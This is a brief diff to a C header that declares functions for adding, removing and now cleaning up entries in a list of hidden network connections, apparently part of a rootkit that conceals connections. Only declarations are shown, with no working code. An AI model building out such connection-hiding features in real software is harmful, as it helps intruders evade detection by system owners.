@@ -9,4 +9,5 @@ extern struct list_head hidden_conn_list;
 
 void network_hide_add(struct sockaddr_in addr);
 void network_hide_remove(struct sockaddr_in addr);
+void network_hide_cleanup(void);
 //void hide_conn(char *ip_str);
